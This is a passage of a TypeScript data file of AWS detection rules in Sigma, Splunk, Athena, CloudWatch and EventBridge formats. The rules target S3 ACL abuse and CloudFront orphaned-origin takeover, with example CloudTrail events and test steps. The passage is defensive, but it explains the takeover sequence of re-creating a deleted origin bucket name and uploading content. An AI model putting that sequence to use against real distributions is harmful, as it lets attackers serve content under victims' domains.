| eval is_access=if(eventName IN ("GetObject","ListBucket","PutObject"), 1, 0)
| transaction bucket maxspan=1h
| where mvcount(mvfilter(is_acl=1))>0 AND mvcount(mvfilter(is_access=1))>0
| table _time, bucket, actor, eventName`,
      cloudtrail: `WITH acl_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS acl_time, requestParameters.bucketName AS bucket
  FROM cloudtrail_logs
  WHERE eventSource = 's3.amazonaws.com'
    AND eventName IN ('PutBucketAcl', 'PutObjectAcl')
),
access_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS access_time, requestParameters.bucketName AS bucket, eventName
  FROM cloudtrail_logs
  WHERE eventSource = 's3.amazonaws.com'
    AND eventName IN ('GetObject', 'ListBucket', 'PutObject')
)
SELECT a.actor, a.bucket, a.acl_time, e.access_time, e.eventName
FROM acl_evt a
JOIN access_evt e ON a.bucket = e.bucket
  AND e.access_time > a.acl_time
  AND e.access_time <= a.acl_time + INTERVAL '1' HOUR
ORDER BY a.acl_time DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.bucketName
| filter eventSource = "s3.amazonaws.com"
| filter eventName in ["PutBucketAcl", "PutObjectAcl", "GetObject", "ListBucket", "PutObject"]
| stats count(*) as cnt, collect_list(eventName) as events by requestParameters.bucketName
| filter cnt >= 2
| sort cnt desc`,
      eventbridge: JSON.stringify({ source: ["aws.s3"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["s3.amazonaws.com"], eventName: ["PutBucketAcl", "PutObjectAcl"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "s3.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.bucketName", "requestParameters.AccessControlPolicy", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "s3.amazonaws.com", eventName: "PutBucketAcl", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { bucketName: "target" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify ACL change and subsequent access.", "Verify if access was from granted principal.", "Check AccessControlPolicy for grantee."],
    testingSteps: ["PutBucketAcl granting access, then GetObject from granted principal within 1h.", "Run Splunk or Athena correlation query."],
  },

  // --- CloudFront Orphaned Origin Takeover ---
  {
    id: "det-136",
    title: "S3 Bucket Deleted That Matches CloudFront Origin",
    description: "Detect the local control-plane event that creates orphan risk. Deleting a bucket that is still used by CloudFront is the main local precursor to orphaned-origin takeover.",
    awsService: "S3",
    relatedServices: ["CloudFront"],
    severity: "High",
    tags: ["CloudFront", "S3", "Origin Takeover"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Authorized bucket deletion", "Distribution updated first"],
    rules: {
      sigma: `title: S3 Bucket Deleted That Matches CloudFront Origin
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: s3.amazonaws.com
    eventName: DeleteBucket
  condition: selection
level: high
# Enrich: correlate requestParameters.bucketName with CloudFront distribution origin domains.`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=s3.amazonaws.com eventName=DeleteBucket
| table _time, userIdentity.arn, eventName, requestParameters.bucketName, sourceIPAddress
# Enrich: lookup bucket name in CloudFront distribution origins (DescribeDistribution)`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.bucketName, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 's3.amazonaws.com'
  AND eventName = 'DeleteBucket'
ORDER BY eventTime DESC
-- Enrich: Join with cloudfront:ListDistributions / DescribeDistribution to find origins matching bucket.s3.amazonaws.com`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.bucketName, sourceIPAddress
| filter eventSource = "s3.amazonaws.com"
| filter eventName = "DeleteBucket"
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.s3"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["s3.amazonaws.com"], eventName: ["DeleteBucket"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "s3.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.bucketName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "s3.amazonaws.com", eventName: "DeleteBucket", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/admin" }, requestParameters: { bucketName: "my-bucket" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the deleted bucket name.", "Check CloudFront distributions for matching S3 origin.", "Remediate orphaned origins if found."],
    testingSteps: ["Delete bucket that is CloudFront origin.", "Verify detection triggers.", "Run CloudFront origin inventory."],
  },
  {
    id: "det-137",
    title: "Orphaned CloudFront S3 Origin Detection",
    description: "Posture/scheduled analytics: detect distributions whose configured S3 origin no longer exists. Compare CloudFront distribution origin bucket names against currently existing S3 buckets. This is the actual exploitable state.",
    awsService: "CloudFront",
    relatedServices: ["S3"],
    severity: "Critical",
    tags: ["CloudFront", "S3", "Origin Takeover", "Posture"],
    logSources: ["AWS CloudTrail", "CloudFront API"],
    falsePositives: ["Custom domain origin", "Non-S3 origin"],
    rules: {
      sigma: `title: Orphaned CloudFront S3 Origin
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: cloudfront.amazonaws.com
    eventName: GetDistribution
  condition: selection
level: critical
# Posture hunt: List distributions, for each S3 origin (bucket.s3.amazonaws.com) check if bucket exists via s3:HeadBucket. Flag if missing.`,
      splunk: `# Posture hunt: Run cloudfront list-distributions, extract origin DomainName (bucket.s3.amazonaws.com)
# For each, extract bucket name and run s3 HeadBucket or list-buckets. Flag distributions where bucket does not exist.
index=aws sourcetype=aws:cloudtrail eventSource=cloudfront.amazonaws.com eventName=GetDistribution
| table _time, requestParameters.id, responseElements.distributionConfig.origins`,
      cloudtrail: `-- Posture hunt: Use CloudFront ListDistributions + DescribeDistribution API
-- For each distribution, get origins with DomainName like %.s3.% or %.s3.amazonaws.com
-- For each such origin, extract bucket name and verify via S3 HeadBucket or ListBuckets
-- Flag distributions where S3 origin bucket does not exist
SELECT eventTime, eventSource, eventName, requestParameters.id
FROM cloudtrail_logs
WHERE eventSource = 'cloudfront.amazonaws.com'
  AND eventName IN ('GetDistribution', 'ListDistributions')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, eventSource, eventName, requestParameters.id
| filter eventSource = "cloudfront.amazonaws.com"
| filter eventName in ["GetDistribution", "ListDistributions"]
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.cloudfront"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["cloudfront.amazonaws.com"], eventName: ["GetDistribution"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "cloudfront.amazonaws.com", importantFields: ["eventSource", "eventName", "requestParameters.id", "responseElements.distributionConfig.origins", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "cloudfront.amazonaws.com", eventName: "GetDistribution", requestParameters: { id: "E1234" }, responseElements: { distributionConfig: { origins: { items: [{ domainName: "deleted-bucket.s3.amazonaws.com" }] } } }, eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Run CloudFront distribution inventory.", "For each S3 origin, verify bucket exists.", "Remediate or reserve bucket names for orphaned origins."],
    testingSteps: ["Delete bucket used as CloudFront origin.", "Run posture check to identify orphaned distribution."],
  },
  {
    id: "det-138",
    title: "Orphaned Origin on Sensitive or Public Distribution",
    description: "Prioritize orphaned origins on internet-facing or high-value distributions. Distribution is sensitive, high-traffic, customer-facing, or uses important alternate domain names.",
    awsService: "CloudFront",
    relatedServices: ["S3"],
    severity: "Critical",
    tags: ["CloudFront", "S3", "Origin Takeover", "Sensitive Target"],
    logSources: ["AWS CloudTrail", "CloudFront API"],
    falsePositives: ["Internal-only distribution"],
    rules: {
      sigma: `title: Orphaned Origin on Sensitive Distribution
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: cloudfront.amazonaws.com
    eventName: GetDistribution
  condition: selection
level: critical
# Posture: Combine det-137 with distribution aliases/domain filters (prod, www, customer-facing).`,
      splunk: `# Posture: Filter orphaned-origin results for distributions with Aliases containing prod, www, customer domains`,
      cloudtrail: `-- Posture: Same as det-137, filter for distributions where Aliases.Items contains prod/www/customer domains`,
      cloudwatch: `fields @timestamp, eventSource, eventName, requestParameters.id
| filter eventSource = "cloudfront.amazonaws.com"
| filter eventName = "GetDistribution"
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.cloudfront"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["cloudfront.amazonaws.com"], eventName: ["GetDistribution"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "cloudfront.amazonaws.com", importantFields: ["eventSource", "eventName", "requestParameters.id", "responseElements.distributionConfig.aliases", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "cloudfront.amazonaws.com", eventName: "GetDistribution", requestParameters: { id: "E1234" }, responseElements: { distributionConfig: { aliases: { items: ["www.example.com"] } } }, eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify orphaned distributions with customer-facing aliases.", "Prioritize remediation.", "Reserve bucket name or update origin."],
    testingSteps: ["Run posture check filtered for prod/www aliases."],
  },
  {
    id: "det-139",
    title: "Bucket Recreated Matching Former CloudFront Origin Name",
    description: "Detect possible takeover if bucket name reuse is visible. CreateBucket for a bucket name that matches a previously deleted bucket still referenced by CloudFront. Most applicable where org-wide logging or external monitoring can observe recreation.",
    awsService: "S3",
    relatedServices: ["CloudFront"],
    severity: "Critical",
    tags: ["CloudFront", "S3", "Origin Takeover"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate bucket recreation", "Same-account restore"],
    rules: {
      sigma: `title: Bucket Recreated Matching Former CloudFront Origin
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: s3.amazonaws.com
    eventName: CreateBucket
  condition: selection
level: critical
# Enrich: Match requestParameters.bucketName to known deleted buckets that were CloudFront origins. Requires baseline.`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=s3.amazonaws.com eventName=CreateBucket
| table _time, userIdentity.arn, eventName, requestParameters.bucketName, recipientAccountId, sourceIPAddress
# Enrich: lookup bucket name in baseline of deleted-bucket-names-that-were-cloudfront-origins`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.bucketName, recipientAccountId, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 's3.amazonaws.com'
  AND eventName = 'CreateBucket'
ORDER BY eventTime DESC
-- Enrich: Join with baseline of (bucketName) from DeleteBucket events where bucket was CloudFront origin`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.bucketName, recipientAccountId, sourceIPAddress
| filter eventSource = "s3.amazonaws.com"
| filter eventName = "CreateBucket"
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.s3"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["s3.amazonaws.com"], eventName: ["CreateBucket"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "s3.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.bucketName", "recipientAccountId", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "s3.amazonaws.com", eventName: "CreateBucket", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::999999999999:user/attacker" }, requestParameters: { bucketName: "deleted-victim-bucket" }, recipientAccountId: "999999999999", sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the recreated bucket name.", "Check if it matches a deleted CloudFront origin.", "Verify if recreation was in different account."],
    testingSteps: ["Create bucket with name of previously deleted CloudFront origin.", "Verify detection with baseline."],
  },
  {
    id: "det-140",
    title: "Orphaned Origin Followed by CloudFront or S3 Access Anomaly",
    description: "High-confidence takeover signal: orphaned origin state then unusual CloudFront content behavior, origin errors changing to successful fetches, or new bucket activity tied to the reused bucket name.",
    awsService: "CloudFront",
    relatedServices: ["S3"],
    severity: "Critical",
    tags: ["CloudFront", "S3", "Origin Takeover", "Behavior Correlation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate bucket recreation and use"],
    rules: {
      sigma: `title: Orphaned Origin Followed by Access Anomaly
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_create:
    eventSource: s3.amazonaws.com
    eventName: CreateBucket
  selection_put:
    eventSource: s3.amazonaws.com
    eventName: PutObject
  condition: 1 of selection_*
level: critical
# Full correlation: CreateBucket (matching orphaned origin name) + PutObject to same bucket within 1h.`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=s3.amazonaws.com (eventName=CreateBucket OR eventName=PutObject)
| eval bucket=requestParameters.bucketName
| eval actor=coalesce(userIdentity.arn, userIdentity.accountId)
| eval is_create=if(eventName="CreateBucket", 1, 0)
| eval is_put=if(eventName="PutObject", 1, 0)
| transaction bucket maxspan=1h
| where mvcount(mvfilter(is_create=1))>0 AND mvcount(mvfilter(is_put=1))>0
| table _time, bucket, actor, eventName`,
      cloudtrail: `WITH create_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS create_time, requestParameters.bucketName AS bucket
  FROM cloudtrail_logs
  WHERE eventSource = 's3.amazonaws.com'
    AND eventName = 'CreateBucket'
),
put_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS put_time, requestParameters.bucketName AS bucket, eventName
  FROM cloudtrail_logs
  WHERE eventSource = 's3.amazonaws.com'
    AND eventName = 'PutObject'
)
SELECT c.actor, c.bucket, c.create_time, p.put_time
FROM create_evt c
JOIN put_evt p ON c.bucket = p.bucket
  AND p.put_time > c.create_time
  AND p.put_time <= c.create_time + INTERVAL '1' HOUR
ORDER BY c.create_time DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.bucketName
| filter eventSource = "s3.amazonaws.com"
| filter eventName in ["CreateBucket", "PutObject"]
| stats count(*) as cnt, collect_list(eventName) as events by requestParameters.bucketName
| filter cnt >= 2
| sort cnt desc`,
      eventbridge: JSON.stringify({ source: ["aws.s3"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["s3.amazonaws.com"], eventName: ["CreateBucket", "PutObject"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "s3.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.bucketName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "s3.amazonaws.com", eventName: "CreateBucket", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::999999999999:user/attacker" }, requestParameters: { bucketName: "deleted-victim-bucket" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify CreateBucket and PutObject sequence.", "Verify if bucket name matches orphaned CloudFront origin.", "Check for malicious content in PutObject."],
    testingSteps: ["Create bucket matching orphaned origin, then PutObject within 1h.", "Run Splunk or Athena correlation query."],
  },
];

/**
 * Get detections grouped by PRIMARY AWS service only (for sidebar navigation).
 * Each rule appears once under its primary service — no duplicates.
 */
export function getDetectionsByService(): Record<string, Detection[]> {
  const grouped: Record<string, Detection[]> = {};
  const serviceOrder = ["IAM", "STS", "Lambda", "EC2", "S3", "EBS", "DynamoDB", "CloudTrail", "KMS", "EKS", "ECS", "Secrets Manager", "SSM", "SageMaker", "SES", "CodeBuild", "Elastic Beanstalk", "CloudFront", "Organizations"];

  for (const service of serviceOrder) {
    const serviceDetections = detections.filter((d) => d.awsService === service);
    if (serviceDetections.length > 0) {
      grouped[service] = serviceDetections;
    }
  }

  return grouped;
}

/**
 * Get detections for a specific service (primary + related).
 */
export function getDetectionsForService(service: string): Detection[] {
  return detections.filter(
    (d) => d.awsService === service || d.relatedServices.includes(service)
  );
}

/**
 * Get all unique services that have detection rules.
 */
export function getServicesWithDetections(): string[] {
  const services = new Set<string>();
  detections.forEach((d) => {
    services.add(d.awsService);
    d.relatedServices.forEach((s) => services.add(s));
  });
  const order = ["IAM", "STS", "Lambda", "EC2", "S3", "EBS", "DynamoDB", "CloudTrail", "KMS", "EKS", "ECS", "Secrets Manager", "SSM", "SageMaker", "SES", "CodeBuild", "Elastic Beanstalk", "CloudFront", "Organizations"];
  return order.filter((s) => services.has(s));
}

/**
 * Default telemetry for CloudTrail-based detections when not specified.
 */
export function getDefaultTelemetry(d: Detection): TelemetrySource {
  const primaryLogSource = d.logSources[0] || "AWS CloudTrail";
  return {
    primaryLogSource,
    generatingService: d.awsService.toLowerCase() + ".amazonaws.com",
    importantFields: ["eventName", "userIdentity.arn", "userIdentity.type", "requestParameters", "sourceIPAddress", "eventSource", "eventTime"],
    exampleEvent: JSON.stringify(
      {
        eventVersion: "1.08",
        eventSource: d.awsService.toLowerCase() + ".amazonaws.com",
        eventName: "ExampleEvent",
        userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" },
        requestParameters: {},
        sourceIPAddress: "203.0.113.10",
        eventTime: new Date().toISOString(),
      },
      null,
      2
    ),
  };
}
